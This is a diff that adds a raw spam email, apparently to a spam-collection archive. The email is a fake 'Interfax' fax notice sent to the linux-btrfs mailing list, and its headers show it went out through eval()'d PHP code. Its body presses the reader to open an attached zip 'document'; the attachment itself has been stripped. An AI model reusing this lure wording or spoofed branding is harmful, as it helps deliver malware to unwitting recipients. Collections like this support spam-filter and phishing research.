@@ -1,0 +1,82 @@
+Delivered-To: bruce@untroubled.org
+Received: (fqmail 23987 invoked from network); 17 Jan 2016 13:36:37 -0000
+Received: (qmail 24170 invoked from network); 17 Jan 2016 13:36:37 -0000
+Received: from rip.mx05.futurequest.net (rip.mx05.futurequest.net [10.2.1.176])
+  by mx05.futurequest.net ([69.5.6.176]); 17 Jan 2016 13:36:37 -0000
+Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
+  by rip.mx05.futurequest.net ([10.2.1.176])
+  with ESMTP via TCP; 17 Jan 2016 13:36:37 -0000
+Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
+	id S1752182AbcAQNfy (ORCPT <rfc822;bruce@untroubled.org>);
+	Sun, 17 Jan 2016 08:35:54 -0500
+Received: from mr7.ht-systems.ru ([78.110.50.178]:36793 "EHLO
+	mr7.ht-systems.ru" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1752152AbcAQNfx (ORCPT
+	<rfc822;linux-btrfs@vger.kernel.org>);
+	Sun, 17 Jan 2016 08:35:53 -0500
+X-Greylist: delayed 12786 seconds by postgrey-1.27 at vger.kernel.org; Sun, 17 Jan 2016 08:35:53 EST
+Received: from [78.110.50.24] (helo=cl9.ht-systems.ru)
+	by mr5.ht-systems.ru with esmtp (Exim 4.80.1)
+	(envelope-from <srv40113@cl9-w.ht-systems.ru>)
+	id 1aKkAT-0002J6-SG
+	for linux-btrfs@vger.kernel.org; Sun, 17 Jan 2016 13:02:42 +0300
+Received: from cl9-w.ht-systems.ru (cl9-w.ht-systems.ru [78.110.50.124])
+	by cl9.ht-systems.ru (Postfix) with ESMTP id C5276E1C9B
+	for <linux-btrfs@vger.kernel.org>; Sun, 17 Jan 2016 13:02:40 +0300 (MSK)
+Received: (from srv40113@localhost)
+	by cl9-w.ht-systems.ru (8.14.4/8.14.4/Submit) id u0HA2egk003327;
+	Sun, 17 Jan 2016 13:02:40 +0300
+To: linux-btrfs@vger.kernel.org
+Subject: You have 1 new fax, document 0000345614
+X-Hosting-User: srv40113
+X-PHP-Script: /home/srv40113/htdocs/post.php(5) : regexp code(1) : eval()'d code(17) : eval()'d code
+X-PHP-Uri: xn----dtbhabimeqv0bke6k.xn--p1ai/post.php
+X-PHP-Addr: 68.169.36.6
+X-PHP-Originating-Script: 40113:post.php(5) : regexp code(1) : eval()'d code(17) : eval()'d code
+Date: Sun, 17 Jan 2016 13:02:40 +0300
+From: "Interfax" <incoming@interfax.net>
+Reply-To: "Interfax" <incoming@interfax.net>
+Message-ID: <089d312bac16c18ec244371887be1e7a@interfax.net>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="b1_46b1bc87ebf65648561c1cb5956ad38b"
+Content-Transfer-Encoding: 8bit
+Sender: linux-btrfs-owner@vger.kernel.org
+Precedence: bulk
+List-ID: <linux-btrfs.vger.kernel.org>
+X-Mailing-List: linux-btrfs@vger.kernel.org
+Content-Length: 931
+
+--b1_46b1bc87ebf65648561c1cb5956ad38b
+Content-Type: text/plain; charset=us-ascii
+
+A new fax document for you.
+
+Please download attached fax document.
+
+Resolution:         200 DPI
+Pages number:       6
+File name:          scanned_0000345614.doc
+Scan time:          26 seconds
+Author:             Howard Goldman
+Scan date:          Sun, 17 Jan 2016 04:16:07 +0300
+File size:          245 Kb
+
+Thank you for using Interfax!
+
+
+--b1_46b1bc87ebf65648561c1cb5956ad38b
+Content-Type: message/external-body; access-type=x-deleted; length=1999
+
+
+Content-Type: application/zip; name="scanned_0000345614.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=scanned_0000345614.zip
+
+--b1_46b1bc87ebf65648561c1cb5956ad38b--
+
+--
+To unsubscribe from this list: send the line "unsubscribe linux-btrfs" in
+the body of a message to majordomo@vger.kernel.org
+More majordomo info at  http://vger.kernel.org/majordomo-info.html
